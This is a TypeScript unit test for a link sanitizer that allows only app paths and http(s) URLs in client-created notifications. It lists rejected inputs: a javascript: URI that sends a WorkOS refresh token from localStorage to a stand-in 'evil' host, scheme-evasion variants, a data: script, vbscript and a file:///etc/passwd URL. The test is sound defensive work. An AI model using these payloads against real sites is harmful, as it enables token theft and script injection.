// lib/notification-link.ts: a notification's link is attacker-controlled
// (createNotification is client-callable), so only http(s) is ever followed.

import { describe, expect, test } from "bun:test";
import { notificationHref } from "@/lib/notification-link";

const BASE = "https://www.merchiva.com/manager/notifications";

describe("notificationHref", () => {
  test("app paths and http(s) links are followed", () => {
    expect(notificationHref("/manager/channel?c=abc", BASE)).toBe("https://www.merchiva.com/manager/channel?c=abc");
    expect(notificationHref("https://example.com/x", BASE)).toBe("https://example.com/x");
  });

  test.each([
    "javascript:fetch('https://evil/?'+localStorage.workos_refresh_token)",
    "JavaScript:alert(1)",
    " javascript:alert(1)",
    "java\tscript:alert(1)",
    "data:text/html,<script>alert(1)</script>",
    "vbscript:msgbox(1)",
    "file:///etc/passwd",
  ])("refuses %p", (link) => {
    expect(notificationHref(link, BASE)).toBeNull();
  });
});
